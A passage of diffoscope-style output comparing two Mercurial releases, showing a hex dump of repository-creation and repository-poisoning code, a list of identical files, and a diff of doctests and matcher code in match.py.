+000229b0: 6869 6368 2073 746f 7261 6765 2073 686f  hich storage sho
+000229c0: 756c 6420 6265 2073 6861 7265 642e 0a20  uld be shared.. 
+000229d0: 2020 2073 6861 7265 6472 656c 6174 6976     sharedrelativ
+000229e0: 650a 2020 2020 2020 2042 6f6f 6c65 616e  e.       Boolean
+000229f0: 2069 6e64 6963 6174 696e 6720 6966 2074   indicating if t
+00022a00: 6865 2070 6174 6820 746f 2074 6865 2073  he path to the s
+00022a10: 6861 7265 6420 7265 706f 2073 686f 756c  hared repo shoul
+00022a20: 6420 6265 0a20 2020 2020 2020 7374 6f72  d be.       stor
+00022a30: 6564 2061 7320 7265 6c61 7469 7665 2e20  ed as relative. 
+00022a40: 4279 2064 6566 6175 6c74 2c20 7468 6520  By default, the 
+00022a50: 706f 696e 7465 7220 746f 2074 6865 2022  pointer to the "
+00022a60: 7061 7265 6e74 2220 7265 706f 0a20 2020  parent" repo.   
+00022a70: 2020 2020 6973 2073 746f 7265 6420 6173      is stored as
+00022a80: 2061 6e20 6162 736f 6c75 7465 2070 6174   an absolute pat
+00022a90: 682e 0a20 2020 2073 6861 7265 6469 7465  h..    sharedite
+00022aa0: 6d73 0a20 2020 2020 2020 5365 7420 6f66  ms.       Set of
+00022ab0: 2069 7465 6d73 2074 6f20 7368 6172 6520   items to share 
+00022ac0: 746f 2074 6865 206e 6577 2072 6570 6f73  to the new repos
+00022ad0: 6974 6f72 7920 2869 6e20 6164 6469 7469  itory (in additi
+00022ae0: 6f6e 2074 6f20 7374 6f72 6167 6529 2e0a  on to storage)..
+00022af0: 2020 2020 7368 616c 6c6f 7766 696c 6573      shallowfiles
+00022b00: 746f 7265 0a20 2020 2020 2020 496e 6469  tore.       Indi
+00022b10: 6361 7465 7320 7468 6174 2073 746f 7261  cates that stora
+00022b20: 6765 2066 6f72 2066 696c 6573 2073 686f  ge for files sho
+00022b30: 756c 6420 6265 2073 6861 6c6c 6f77 2028  uld be shallow (
+00022b40: 6e6f 7420 616c 6c20 616e 6365 7374 6f72  not all ancestor
+00022b50: 0a20 2020 2020 2020 7265 7669 7369 6f6e  .       revision
+00022b60: 7320 6172 6520 6b6e 6f77 6e29 2e0a 2020  s are known)..  
+00022b70: 2020 2222 220a 0a20 2020 2069 6620 7265    """..    if re
+00022b80: 7175 6972 656d 656e 7473 2069 7320 6e6f  quirements is no
+00022b90: 7420 4e6f 6e65 3a0a 2020 2020 2020 2020  t None:.        
+00022ba0: 6966 2063 7265 6174 656f 7074 7320 6973  if createopts is
+00022bb0: 206e 6f74 204e 6f6e 653a 0a20 2020 2020   not None:.     
+00022bc0: 2020 2020 2020 206d 7367 203d 2062 2763         msg = b'c
+00022bd0: 616e 6e6f 7420 7370 6563 6966 7920 626f  annot specify bo
+00022be0: 7468 2063 7265 6174 656f 7074 7320 616e  th createopts an
+00022bf0: 6420 7265 7175 6972 656d 656e 7473 270a  d requirements'.
+00022c00: 2020 2020 2020 2020 2020 2020 7261 6973              rais
+00022c10: 6520 6572 726f 722e 5072 6f67 7261 6d6d  e error.Programm
+00022c20: 696e 6745 7272 6f72 286d 7367 290a 2020  ingError(msg).  
+00022c30: 2020 2020 2020 6372 6561 7465 6f70 7473        createopts
+00022c40: 203d 207b 7d0a 2020 2020 656c 7365 3a0a   = {}.    else:.
+00022c50: 2020 2020 2020 2020 6372 6561 7465 6f70          createop
+00022c60: 7473 203d 2064 6566 6175 6c74 6372 6561  ts = defaultcrea
+00022c70: 7465 6f70 7473 2875 692c 2063 7265 6174  teopts(ui, creat
+00022c80: 656f 7074 733d 6372 6561 7465 6f70 7473  eopts=createopts
+00022c90: 290a 0a20 2020 2020 2020 2075 6e6b 6e6f  )..        unkno
+00022ca0: 776e 6f70 7473 203d 2066 696c 7465 726b  wnopts = filterk
+00022cb0: 6e6f 776e 6372 6561 7465 6f70 7473 2875  nowncreateopts(u
+00022cc0: 692c 2063 7265 6174 656f 7074 7329 0a0a  i, createopts)..
+00022cd0: 2020 2020 2020 2020 6966 206e 6f74 2069          if not i
+00022ce0: 7369 6e73 7461 6e63 6528 756e 6b6e 6f77  sinstance(unknow
+00022cf0: 6e6f 7074 732c 2064 6963 7429 3a0a 2020  nopts, dict):.  
+00022d00: 2020 2020 2020 2020 2020 7261 6973 6520            raise 
+00022d10: 6572 726f 722e 5072 6f67 7261 6d6d 696e  error.Programmin
+00022d20: 6745 7272 6f72 280a 2020 2020 2020 2020  gError(.        
+00022d30: 2020 2020 2020 2020 6227 6669 6c74 6572          b'filter
+00022d40: 6b6e 6f77 6e63 7265 6174 656f 7074 7328  knowncreateopts(
+00022d50: 2920 6469 6420 6e6f 7420 7265 7475 726e  ) did not return
+00022d60: 2061 2064 6963 7427 0a20 2020 2020 2020   a dict'.       
+00022d70: 2020 2020 2029 0a0a 2020 2020 2020 2020       )..        
+00022d80: 6966 2075 6e6b 6e6f 776e 6f70 7473 3a0a  if unknownopts:.
+00022d90: 2020 2020 2020 2020 2020 2020 7261 6973              rais
+00022da0: 6520 6572 726f 722e 4162 6f72 7428 0a20  e error.Abort(. 
+00022db0: 2020 2020 2020 2020 2020 2020 2020 205f                 _
+00022dc0: 280a 2020 2020 2020 2020 2020 2020 2020  (.              
+00022dd0: 2020 2020 2020 6227 756e 6162 6c65 2074        b'unable t
+00022de0: 6f20 6372 6561 7465 2072 6570 6f73 6974  o create reposit
+00022df0: 6f72 7920 6265 6361 7573 6520 6f66 2075  ory because of u
+00022e00: 6e6b 6e6f 776e 2027 0a20 2020 2020 2020  nknown '.       
+00022e10: 2020 2020 2020 2020 2020 2020 2062 2763               b'c
+00022e20: 7265 6174 696f 6e20 6f70 7469 6f6e 3a20  reation option: 
+00022e30: 2573 270a 2020 2020 2020 2020 2020 2020  %s'.            
+00022e40: 2020 2020 290a 2020 2020 2020 2020 2020      ).          
+00022e50: 2020 2020 2020 2520 6227 2c20 272e 6a6f        % b', '.jo
+00022e60: 696e 2873 6f72 7465 6428 756e 6b6e 6f77  in(sorted(unknow
+00022e70: 6e6f 7074 7329 292c 0a20 2020 2020 2020  nopts)),.       
+00022e80: 2020 2020 2020 2020 2068 696e 743d 5f28           hint=_(
+00022e90: 6227 6973 2061 2072 6571 7569 7265 6420  b'is a required 
+00022ea0: 6578 7465 6e73 696f 6e20 6e6f 7420 6c6f  extension not lo
+00022eb0: 6164 6564 3f27 292c 0a20 2020 2020 2020  aded?'),.       
+00022ec0: 2020 2020 2029 0a0a 2020 2020 2020 2020       )..        
+00022ed0: 7265 7175 6972 656d 656e 7473 203d 206e  requirements = n
+00022ee0: 6577 7265 706f 7265 7175 6972 656d 656e  ewreporequiremen
+00022ef0: 7473 2875 692c 2063 7265 6174 656f 7074  ts(ui, createopt
+00022f00: 733d 6372 6561 7465 6f70 7473 290a 2020  s=createopts).  
+00022f10: 2020 2020 2020 7265 7175 6972 656d 656e        requiremen
+00022f20: 7473 202d 3d20 6368 6563 6b72 6571 7569  ts -= checkrequi
+00022f30: 7265 6d65 6e74 7363 6f6d 7061 7428 7569  rementscompat(ui
+00022f40: 2c20 7265 7175 6972 656d 656e 7473 290a  , requirements).
+00022f50: 0a20 2020 2077 6469 7276 6673 203d 2076  .    wdirvfs = v
+00022f60: 6673 6d6f 642e 7666 7328 7061 7468 2c20  fsmod.vfs(path, 
+00022f70: 6578 7061 6e64 7061 7468 3d54 7275 652c  expandpath=True,
+00022f80: 2072 6561 6c70 6174 683d 5472 7565 290a   realpath=True).
+00022f90: 0a20 2020 2068 6776 6673 203d 2076 6673  .    hgvfs = vfs
+00022fa0: 6d6f 642e 7666 7328 7764 6972 7666 732e  mod.vfs(wdirvfs.
+00022fb0: 6a6f 696e 2862 272e 6867 2729 290a 2020  join(b'.hg')).  
+00022fc0: 2020 6966 2068 6776 6673 2e65 7869 7374    if hgvfs.exist
+00022fd0: 7328 293a 0a20 2020 2020 2020 2072 6169  s():.        rai
+00022fe0: 7365 2065 7272 6f72 2e52 6570 6f45 7272  se error.RepoErr
+00022ff0: 6f72 285f 2862 2772 6570 6f73 6974 6f72  or(_(b'repositor
+00023000: 7920 2573 2061 6c72 6561 6479 2065 7869  y %s already exi
+00023010: 7374 7327 2920 2520 7061 7468 290a 0a20  sts') % path).. 
+00023020: 2020 2069 6620 6227 7368 6172 6564 7265     if b'sharedre
+00023030: 706f 2720 696e 2063 7265 6174 656f 7074  po' in createopt
+00023040: 733a 0a20 2020 2020 2020 2073 6861 7265  s:.        share
+00023050: 6470 6174 6820 3d20 6372 6561 7465 6f70  dpath = createop
+00023060: 7473 5b62 2773 6861 7265 6472 6570 6f27  ts[b'sharedrepo'
+00023070: 5d2e 7368 6172 6564 7061 7468 0a0a 2020  ].sharedpath..  
+00023080: 2020 2020 2020 6966 2063 7265 6174 656f        if createo
+00023090: 7074 732e 6765 7428 6227 7368 6172 6564  pts.get(b'shared
+000230a0: 7265 6c61 7469 7665 2729 3a0a 2020 2020  relative'):.    
+000230b0: 2020 2020 2020 2020 7472 793a 0a20 2020          try:.   
+000230c0: 2020 2020 2020 2020 2020 2020 2073 6861               sha
+000230d0: 7265 6470 6174 6820 3d20 6f73 2e70 6174  redpath = os.pat
+000230e0: 682e 7265 6c70 6174 6828 7368 6172 6564  h.relpath(shared
+000230f0: 7061 7468 2c20 6867 7666 732e 6261 7365  path, hgvfs.base
+00023100: 290a 2020 2020 2020 2020 2020 2020 2020  ).              
+00023110: 2020 7368 6172 6564 7061 7468 203d 2075    sharedpath = u
+00023120: 7469 6c2e 7063 6f6e 7665 7274 2873 6861  til.pconvert(sha
+00023130: 7265 6470 6174 6829 0a20 2020 2020 2020  redpath).       
+00023140: 2020 2020 2065 7863 6570 7420 2849 4f45       except (IOE
+00023150: 7272 6f72 2c20 5661 6c75 6545 7272 6f72  rror, ValueError
+00023160: 2920 6173 2065 3a0a 2020 2020 2020 2020  ) as e:.        
+00023170: 2020 2020 2020 2020 2320 5661 6c75 6545          # ValueE
+00023180: 7272 6f72 2069 7320 7261 6973 6564 206f  rror is raised o
+00023190: 6e20 5769 6e64 6f77 7320 6966 2074 6865  n Windows if the
+000231a0: 2064 7269 7665 206c 6574 7465 7273 2064   drive letters d
+000231b0: 6966 6665 720a 2020 2020 2020 2020 2020  iffer.          
+000231c0: 2020 2020 2020 2320 6f6e 2065 6163 6820        # on each 
+000231d0: 7061 7468 2e0a 2020 2020 2020 2020 2020  path..          
+000231e0: 2020 2020 2020 7261 6973 6520 6572 726f        raise erro
+000231f0: 722e 4162 6f72 7428 0a20 2020 2020 2020  r.Abort(.       
+00023200: 2020 2020 2020 2020 2020 2020 205f 2862               _(b
+00023210: 2763 616e 6e6f 7420 6361 6c63 756c 6174  'cannot calculat
+00023220: 6520 7265 6c61 7469 7665 2070 6174 6827  e relative path'
+00023230: 292c 0a20 2020 2020 2020 2020 2020 2020  ),.             
+00023240: 2020 2020 2020 2068 696e 743d 7374 7269         hint=stri
+00023250: 6e67 7574 696c 2e66 6f72 6365 6279 7465  ngutil.forcebyte
+00023260: 7374 7228 6529 2c0a 2020 2020 2020 2020  str(e),.        
+00023270: 2020 2020 2020 2020 290a 0a20 2020 2069          )..    i
+00023280: 6620 6e6f 7420 7764 6972 7666 732e 6578  f not wdirvfs.ex
+00023290: 6973 7473 2829 3a0a 2020 2020 2020 2020  ists():.        
+000232a0: 7764 6972 7666 732e 6d61 6b65 6469 7273  wdirvfs.makedirs
+000232b0: 2829 0a0a 2020 2020 6867 7666 732e 6d61  ()..    hgvfs.ma
+000232c0: 6b65 6469 7228 6e6f 7469 6e64 6578 6564  kedir(notindexed
+000232d0: 3d54 7275 6529 0a20 2020 2069 6620 6227  =True).    if b'
+000232e0: 7368 6172 6564 7265 706f 2720 6e6f 7420  sharedrepo' not 
+000232f0: 696e 2063 7265 6174 656f 7074 733a 0a20  in createopts:. 
+00023300: 2020 2020 2020 2068 6776 6673 2e6d 6b64         hgvfs.mkd
+00023310: 6972 2862 2763 6163 6865 2729 0a20 2020  ir(b'cache').   
+00023320: 2068 6776 6673 2e6d 6b64 6972 2862 2777   hgvfs.mkdir(b'w
+00023330: 6361 6368 6527 290a 0a20 2020 2068 6173  cache')..    has
+00023340: 5f73 746f 7265 203d 2072 6571 7569 7265  _store = require
+00023350: 6d65 6e74 736d 6f64 2e53 544f 5245 5f52  mentsmod.STORE_R
+00023360: 4551 5549 5245 4d45 4e54 2069 6e20 7265  EQUIREMENT in re
+00023370: 7175 6972 656d 656e 7473 0a20 2020 2069  quirements.    i
+00023380: 6620 6861 735f 7374 6f72 6520 616e 6420  f has_store and 
+00023390: 6227 7368 6172 6564 7265 706f 2720 6e6f  b'sharedrepo' no
+000233a0: 7420 696e 2063 7265 6174 656f 7074 733a  t in createopts:
+000233b0: 0a20 2020 2020 2020 2068 6776 6673 2e6d  .        hgvfs.m
+000233c0: 6b64 6972 2862 2773 746f 7265 2729 0a0a  kdir(b'store')..
+000233d0: 2020 2020 2020 2020 2320 5765 2063 7265          # We cre
+000233e0: 6174 6520 616e 2069 6e76 616c 6964 2063  ate an invalid c
+000233f0: 6861 6e67 656c 6f67 206f 7574 7369 6465  hangelog outside
+00023400: 2074 6865 2073 746f 7265 2073 6f20 7665   the store so ve
+00023410: 7279 206f 6c64 0a20 2020 2020 2020 2023  ry old.        #
+00023420: 204d 6572 6375 7269 616c 2076 6572 7369   Mercurial versi
+00023430: 6f6e 7320 2877 6869 6368 2064 6964 6e27  ons (which didn'
+00023440: 7420 6b6e 6f77 2061 626f 7574 2074 6865  t know about the
+00023450: 2072 6571 7569 7265 6d65 6e74 730a 2020   requirements.  
+00023460: 2020 2020 2020 2320 6669 6c65 2920 656e        # file) en
+00023470: 636f 756e 7465 7220 616e 2065 7272 6f72  counter an error
+00023480: 206f 6e20 7265 6164 696e 6720 7468 6520   on reading the 
+00023490: 6368 616e 6765 6c6f 672e 2054 6869 730a  changelog. This.
+000234a0: 2020 2020 2020 2020 2320 6566 6665 6374          # effect
+000234b0: 6976 656c 7920 6c6f 636b 7320 6f75 7420  ively locks out 
+000234c0: 6f6c 6420 636c 6965 6e74 7320 616e 6420  old clients and 
+000234d0: 7072 6576 656e 7473 2074 6865 6d20 6672  prevents them fr
+000234e0: 6f6d 0a20 2020 2020 2020 2023 206d 7563  om.        # muc
+000234f0: 6b69 6e67 2077 6974 6820 6120 7265 706f  king with a repo
+00023500: 2069 6e20 616e 2075 6e6b 6e6f 776e 2066   in an unknown f
+00023510: 6f72 6d61 742e 0a20 2020 2020 2020 2023  ormat..        #
+00023520: 0a20 2020 2020 2020 2023 2054 6865 2072  .        # The r
+00023530: 6576 6c6f 6720 6865 6164 6572 2068 6173  evlog header has
+00023540: 2076 6572 7369 6f6e 2036 3535 3335 2c20   version 65535, 
+00023550: 7768 6963 6820 776f 6e27 7420 6265 2072  which won't be r
+00023560: 6563 6f67 6e69 7a65 6420 6279 0a20 2020  ecognized by.   
+00023570: 2020 2020 2023 2073 7563 6820 6f6c 6420       # such old 
+00023580: 636c 6965 6e74 732e 0a20 2020 2020 2020  clients..       
+00023590: 2068 6776 6673 2e61 7070 656e 6428 0a20   hgvfs.append(. 
+000235a0: 2020 2020 2020 2020 2020 2062 2730 3063             b'00c
+000235b0: 6861 6e67 656c 6f67 2e69 272c 0a20 2020  hangelog.i',.   
+000235c0: 2020 2020 2020 2020 2062 275c 305c 305c           b'\0\0\
+000235d0: 7846 465c 7846 4620 6475 6d6d 7920 6368  xFF\xFF dummy ch
+000235e0: 616e 6765 6c6f 6720 746f 2070 7265 7665  angelog to preve
+000235f0: 6e74 2075 7369 6e67 2074 6865 206f 6c64  nt using the old
+00023600: 2072 6570 6f20 270a 2020 2020 2020 2020   repo '.        
+00023610: 2020 2020 6227 6c61 796f 7574 272c 0a20      b'layout',. 
+00023620: 2020 2020 2020 2029 0a0a 2020 2020 2320         )..    # 
+00023630: 4669 6c74 6572 2074 6865 2072 6571 7569  Filter the requi
+00023640: 7265 6d65 6e74 7320 696e 746f 2077 6f72  rements into wor
+00023650: 6b69 6e67 2063 6f70 7920 616e 6420 7374  king copy and st
+00023660: 6f72 6520 6f6e 6573 0a20 2020 2077 6372  ore ones.    wcr
+00023670: 6571 2c20 7374 6f72 6572 6571 203d 2073  eq, storereq = s
+00023680: 636d 7574 696c 2e66 696c 7465 7272 6571  cmutil.filterreq
+00023690: 7569 7265 6d65 6e74 7328 7265 7175 6972  uirements(requir
+000236a0: 656d 656e 7473 290a 2020 2020 2320 7772  ements).    # wr
+000236b0: 6974 6520 776f 726b 696e 6720 636f 7079  ite working copy
+000236c0: 206f 6e65 730a 2020 2020 7363 6d75 7469   ones.    scmuti
+000236d0: 6c2e 7772 6974 6572 6571 7569 7265 7328  l.writerequires(
+000236e0: 6867 7666 732c 2077 6372 6571 290a 2020  hgvfs, wcreq).  
+000236f0: 2020 2320 4966 2074 6865 7265 2061 7265    # If there are
+00023700: 2073 746f 7265 2072 6571 7569 7265 6d65   store requireme
+00023710: 6e74 7320 616e 6420 7468 6520 6375 7272  nts and the curr
+00023720: 656e 7420 7265 706f 7369 746f 7279 0a20  ent repository. 
+00023730: 2020 2023 2069 7320 6e6f 7420 6120 7368     # is not a sh
+00023740: 6172 6564 206f 6e65 2c20 7772 6974 6520  ared one, write 
+00023750: 7374 6f72 6564 2072 6571 7569 7265 6d65  stored requireme
+00023760: 6e74 730a 2020 2020 2320 466f 7220 6e65  nts.    # For ne
+00023770: 7720 7368 6172 6564 2072 6570 6f73 6974  w shared reposit
+00023780: 6f72 792c 2077 6520 646f 6e27 7420 6e65  ory, we don't ne
+00023790: 6564 2074 6f20 7772 6974 6520 7468 6520  ed to write the 
+000237a0: 7374 6f72 650a 2020 2020 2320 7265 7175  store.    # requ
+000237b0: 6972 656d 656e 7473 2061 7320 7468 6579  irements as they
+000237c0: 2061 7265 2061 6c72 6561 6479 2070 7265   are already pre
+000237d0: 7365 6e74 2069 6e20 7374 6f72 6520 7265  sent in store re
+000237e0: 7175 6972 6573 0a20 2020 2069 6620 7374  quires.    if st
+000237f0: 6f72 6572 6571 2061 6e64 2062 2773 6861  orereq and b'sha
+00023800: 7265 6472 6570 6f27 206e 6f74 2069 6e20  redrepo' not in 
+00023810: 6372 6561 7465 6f70 7473 3a0a 2020 2020  createopts:.    
+00023820: 2020 2020 7374 6f72 6576 6673 203d 2076      storevfs = v
+00023830: 6673 6d6f 642e 7666 7328 6867 7666 732e  fsmod.vfs(hgvfs.
+00023840: 6a6f 696e 2862 2773 746f 7265 2729 2c20  join(b'store'), 
+00023850: 6361 6368 6561 7564 6974 6564 3d54 7275  cacheaudited=Tru
+00023860: 6529 0a20 2020 2020 2020 2073 636d 7574  e).        scmut
+00023870: 696c 2e77 7269 7465 7265 7175 6972 6573  il.writerequires
+00023880: 2873 746f 7265 7666 732c 2073 746f 7265  (storevfs, store
+00023890: 7265 7129 0a0a 2020 2020 2320 5772 6974  req)..    # Writ
+000238a0: 6520 6f75 7420 6669 6c65 2074 656c 6c69  e out file telli
+000238b0: 6e67 2072 6561 6465 7273 2077 6865 7265  ng readers where
+000238c0: 2074 6f20 6669 6e64 2074 6865 2073 6861   to find the sha
+000238d0: 7265 6420 7374 6f72 652e 0a20 2020 2069  red store..    i
+000238e0: 6620 6227 7368 6172 6564 7265 706f 2720  f b'sharedrepo' 
+000238f0: 696e 2063 7265 6174 656f 7074 733a 0a20  in createopts:. 
+00023900: 2020 2020 2020 2068 6776 6673 2e77 7269         hgvfs.wri
+00023910: 7465 2862 2773 6861 7265 6470 6174 6827  te(b'sharedpath'
+00023920: 2c20 7368 6172 6564 7061 7468 290a 0a20  , sharedpath).. 
+00023930: 2020 2069 6620 6372 6561 7465 6f70 7473     if createopts
+00023940: 2e67 6574 2862 2773 6861 7265 6469 7465  .get(b'sharedite
+00023950: 6d73 2729 3a0a 2020 2020 2020 2020 7368  ms'):.        sh
+00023960: 6172 6564 203d 2062 275c 6e27 2e6a 6f69  ared = b'\n'.joi
+00023970: 6e28 736f 7274 6564 2863 7265 6174 656f  n(sorted(createo
+00023980: 7074 735b 6227 7368 6172 6564 6974 656d  pts[b'shareditem
+00023990: 7327 5d29 2920 2b20 6227 5c6e 270a 2020  s'])) + b'\n'.  
+000239a0: 2020 2020 2020 6867 7666 732e 7772 6974        hgvfs.writ
+000239b0: 6528 6227 7368 6172 6564 272c 2073 6861  e(b'shared', sha
+000239c0: 7265 6429 0a0a 0a64 6566 2070 6f69 736f  red)...def poiso
+000239d0: 6e72 6570 6f73 6974 6f72 7928 7265 706f  nrepository(repo
+000239e0: 293a 0a20 2020 2022 2222 506f 6973 6f6e  ):.    """Poison
+000239f0: 2061 2072 6570 6f73 6974 6f72 7920 696e   a repository in
+00023a00: 7374 616e 6365 2073 6f20 6974 2063 616e  stance so it can
+00023a10: 206e 6f20 6c6f 6e67 6572 2062 6520 7573   no longer be us
+00023a20: 6564 2e22 2222 0a20 2020 2023 2050 6572  ed.""".    # Per
+00023a30: 666f 726d 2061 6e79 2063 6c65 616e 7570  form any cleanup
+00023a40: 206f 6e20 7468 6520 696e 7374 616e 6365   on the instance
+00023a50: 2e0a 2020 2020 7265 706f 2e63 6c6f 7365  ..    repo.close
+00023a60: 2829 0a0a 2020 2020 2320 4f75 7220 7374  ()..    # Our st
+00023a70: 7261 7465 6779 2069 7320 746f 2072 6570  rategy is to rep
+00023a80: 6c61 6365 2074 6865 2074 7970 6520 6f66  lace the type of
+00023a90: 2074 6865 206f 626a 6563 7420 7769 7468   the object with
+00023aa0: 206f 6e65 2074 6861 740a 2020 2020 2320   one that.    # 
+00023ab0: 6861 7320 616c 6c20 6174 7472 6962 7574  has all attribut
+00023ac0: 6520 6c6f 6f6b 7570 7320 7265 7375 6c74  e lookups result
+00023ad0: 2069 6e20 6572 726f 722e 0a20 2020 2023   in error..    #
+00023ae0: 0a20 2020 2023 2042 7574 2077 6520 6861  .    # But we ha
+00023af0: 7665 2074 6f20 616c 6c6f 7720 7468 6520  ve to allow the 
+00023b00: 636c 6f73 6528 2920 6d65 7468 6f64 2062  close() method b
+00023b10: 6563 6175 7365 2073 6f6d 6520 636f 6e73  ecause some cons
+00023b20: 7472 7563 746f 7273 0a20 2020 2023 206f  tructors.    # o
+00023b30: 6620 7265 706f 7320 6361 6c6c 2063 6c6f  f repos call clo
+00023b40: 7365 2829 206f 6e20 7265 706f 2072 6566  se() on repo ref
+00023b50: 6572 656e 6365 732e 0a20 2020 2063 6c61  erences..    cla
+00023b60: 7373 2070 6f69 736f 6e65 6472 6570 6f73  ss poisonedrepos
+00023b70: 6974 6f72 793a 0a20 2020 2020 2020 2064  itory:.        d
+00023b80: 6566 205f 5f67 6574 6174 7472 6962 7574  ef __getattribut
+00023b90: 655f 5f28 7365 6c66 2c20 6974 656d 293a  e__(self, item):
+00023ba0: 0a20 2020 2020 2020 2020 2020 2069 6620  .            if 
+00023bb0: 6974 656d 203d 3d20 2763 6c6f 7365 273a  item == 'close':
+00023bc0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00023bd0: 2072 6574 7572 6e20 6f62 6a65 6374 2e5f   return object._
+00023be0: 5f67 6574 6174 7472 6962 7574 655f 5f28  _getattribute__(
+00023bf0: 7365 6c66 2c20 6974 656d 290a 0a20 2020  self, item)..   
+00023c00: 2020 2020 2020 2020 2072 6169 7365 2065           raise e
+00023c10: 7272 6f72 2e50 726f 6772 616d 6d69 6e67  rror.Programming
+00023c20: 4572 726f 7228 0a20 2020 2020 2020 2020  Error(.         
+00023c30: 2020 2020 2020 2062 2772 6570 6f20 696e         b'repo in
+00023c40: 7374 616e 6365 7320 7368 6f75 6c64 206e  stances should n
+00023c50: 6f74 2062 6520 7573 6564 2061 6674 6572  ot be used after
+00023c60: 2075 6e73 6861 7265 270a 2020 2020 2020   unshare'.      
+00023c70: 2020 2020 2020 290a 0a20 2020 2020 2020        )..       
+00023c80: 2064 6566 2063 6c6f 7365 2873 656c 6629   def close(self)
+00023c90: 3a0a 2020 2020 2020 2020 2020 2020 7061  :.            pa
+00023ca0: 7373 0a0a 2020 2020 2320 5765 206d 6179  ss..    # We may
+00023cb0: 2068 6176 6520 6120 7265 706f 7669 6577   have a repoview
+00023cc0: 2c20 7768 6963 6820 696e 7465 7263 6570  , which intercep
+00023cd0: 7473 205f 5f73 6574 6174 7472 5f5f 2e20  ts __setattr__. 
+00023ce0: 536f 2062 6520 7375 7265 0a20 2020 2023  So be sure.    #
+00023cf0: 2077 6520 6f70 6572 6174 6520 6174 2074   we operate at t
+00023d00: 6865 206c 6f77 6573 7420 6c65 7665 6c20  he lowest level 
+00023d10: 706f 7373 6962 6c65 2e0a 2020 2020 6f62  possible..    ob
+00023d20: 6a65 6374 2e5f 5f73 6574 6174 7472 5f5f  ject.__setattr__
+00023d30: 2872 6570 6f2c 2027 5f5f 636c 6173 735f  (repo, '__class_
+00023d40: 5f27 2c20 706f 6973 6f6e 6564 7265 706f  _', poisonedrepo
+00023d50: 7369 746f 7279 290a                      sitory).
```

### Comparing `mercurial-6.4.5/mercurial/lock.py` & `mercurial-6.4rc0/mercurial/lock.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/logcmdutil.py` & `mercurial-6.4rc0/mercurial/logcmdutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/logexchange.py` & `mercurial-6.4rc0/mercurial/logexchange.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/loggingutil.py` & `mercurial-6.4rc0/mercurial/loggingutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/lsprof.py` & `mercurial-6.4rc0/mercurial/lsprof.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/lsprofcalltree.py` & `mercurial-6.4rc0/mercurial/lsprofcalltree.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/mail.py` & `mercurial-6.4rc0/mercurial/mail.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/manifest.py` & `mercurial-6.4rc0/mercurial/manifest.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/match.py` & `mercurial-6.4rc0/mercurial/match.py`

 * *Files 0% similar despite different names*

```diff
@@ -192,42 +192,42 @@
                           the same directory
     '<something>' - a pattern of the specified default type
 
     >>> def _match(root, *args, **kwargs):
     ...     return match(util.localpath(root), *args, **kwargs)
 
     Usually a patternmatcher is returned:
-    >>> _match(b'/foo', b'.', [br're:.*\.c$', b'path:foo/a', b'*.py'])
-    <patternmatcher patterns='[^/]*\\.py$|foo/a(?:/|$)|.*\\.c$'>
+    >>> _match(b'/foo', b'.', [b're:.*\.c$', b'path:foo/a', b'*.py'])
+    <patternmatcher patterns='.*\\.c$|foo/a(?:/|$)|[^/]*\\.py$'>
 
     Combining 'patterns' with 'include' (resp. 'exclude') gives an
     intersectionmatcher (resp. a differencematcher):
-    >>> type(_match(b'/foo', b'.', [br're:.*\.c$'], include=[b'path:lib']))
+    >>> type(_match(b'/foo', b'.', [b're:.*\.c$'], include=[b'path:lib']))
     <class 'mercurial.match.intersectionmatcher'>
-    >>> type(_match(b'/foo', b'.', [br're:.*\.c$'], exclude=[b'path:build']))
+    >>> type(_match(b'/foo', b'.', [b're:.*\.c$'], exclude=[b'path:build']))
     <class 'mercurial.match.differencematcher'>
 
     Notice that, if 'patterns' is empty, an alwaysmatcher is returned:
     >>> _match(b'/foo', b'.', [])
     <alwaysmatcher>
 
     The 'default' argument determines which kind of pattern is assumed if a
     pattern has no prefix:
-    >>> _match(b'/foo', b'.', [br'.*\.c$'], default=b're')
+    >>> _match(b'/foo', b'.', [b'.*\.c$'], default=b're')
     <patternmatcher patterns='.*\\.c$'>
     >>> _match(b'/foo', b'.', [b'main.py'], default=b'relpath')
     <patternmatcher patterns='main\\.py(?:/|$)'>
     >>> _match(b'/foo', b'.', [b'main.py'], default=b're')
     <patternmatcher patterns='main.py'>
 
     The primary use of matchers is to check whether a value (usually a file
     name) matches againset one of the patterns given at initialization. There
     are two ways of doing this check.
 
-    >>> m = _match(b'/foo', b'', [br're:.*\.c$', b'relpath:a'])
+    >>> m = _match(b'/foo', b'', [b're:.*\.c$', b'relpath:a'])
 
     1. Calling the matcher with a file name returns True if any pattern
     matches that file name:
     >>> m(b'a')
     True
     >>> m(b'main.c')
     True
@@ -610,35 +610,29 @@
     False
     >>> m(b'b')  # matches relpath:b, since 'root' is 'foo'
     True
     >>> m(b'lib.h')  # matches glob:*.h
     True
 
     >>> m.files()
-    [b'', b'foo/a', b'', b'b']
+    ['', 'foo/a', 'b', '']
     >>> m.exact(b'foo/a')
     True
     >>> m.exact(b'b')
     True
     >>> m.exact(b'lib.h')  # exact matches are for (rel)path kinds
     False
     """
 
     def __init__(self, root, kindpats, badfn=None):
         super(patternmatcher, self).__init__(badfn)
-        kindpats.sort()
 
         self._files = _explicitfiles(kindpats)
         self._prefix = _prefix(kindpats)
-        self._pats, self._matchfn = _buildmatch(kindpats, b'$', root)
-
-    def matchfn(self, fn):
-        if fn in self._fileset:
-            return True
-        return self._matchfn(fn)
+        self._pats, self.matchfn = _buildmatch(kindpats, b'$', root)
 
     @propertycache
     def _dirs(self):
         return set(pathutil.dirs(self._fileset))
 
     def visitdir(self, dir):
         if self._prefix and dir in self._fileset:
```

### Comparing `mercurial-6.4.5/mercurial/mdiff.py` & `mercurial-6.4rc0/mercurial/mdiff.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/merge.py` & `mercurial-6.4rc0/mercurial/merge.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/mergestate.py` & `mercurial-6.4rc0/mercurial/mergestate.py`

 * *Files identical despite different names*

